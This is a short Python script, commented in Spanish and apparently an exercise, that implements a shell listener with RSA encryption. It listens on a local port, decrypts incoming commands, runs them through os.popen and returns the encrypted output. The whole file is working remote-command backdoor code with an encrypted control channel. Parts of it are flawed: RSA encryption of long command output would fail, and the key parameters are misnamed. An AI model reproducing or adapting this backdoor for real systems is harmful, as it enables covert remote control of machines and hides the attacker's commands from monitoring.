#! /usr/bin/python3
# coding=utf-8

"""
Reverse shell + criptografia asimetrica
"""

import socket
import os

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

HOST = "127.0.0.1"
PORT = 44444
llave_pub = open("id_rsa.pub", "r").read()
llave_priv = open("id_rsa", "r").read()

def descifrado(command_cifrado_priv, llave_publica): #pide llave privada
    """
    Decifrar el comando
    param: command_cifrado_priv String to be decrypted
    param: llave_publica public key
    return decrypted string
    """

    rsakey = RSA.importKey(llave_publica)
    rsakey = PKCS1_OAEP.new(rsakey)
    decrypted = rsakey.decrypt(command_cifrado_priv)
    return decrypted

def cifrado(salida_comando, llave_publica):
    '''
    Cifrar el comando
    param: salida_comando String to be encrypted
    param: llave_publica public key
    return base64 encoded encrypted string
    '''

    rsakey = RSA.importKey(llave_publica)
    rsakey = PKCS1_OAEP.new(rsakey)
    encrypted = rsakey.encrypt(salida_comando)
    return encrypted

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
    new_socket.bind((HOST, PORT))
    new_socket.listen()

    while True:
        connection, address = new_socket.accept()
        with connection:
            print(f"Connected by {address}")
            data = connection.recv(10240)
            if descifrado(data,llave_priv).decode("utf-8") != "":
                #print(f"Received data: {data}")
                data_decode = descifrado(data,llave_priv).decode("utf-8")
                print(data_decode)

                cmd_output = os.popen(data_decode).read()
                print(cmd_output)

                cmd_output_bytes = cmd_output.encode("utf-8") #debe estar en bytes
                cifrado_bytes = cifrado(cmd_output_bytes,llave_pub)
                connection.sendall(cifrado_bytes)
            elif not data:
                break
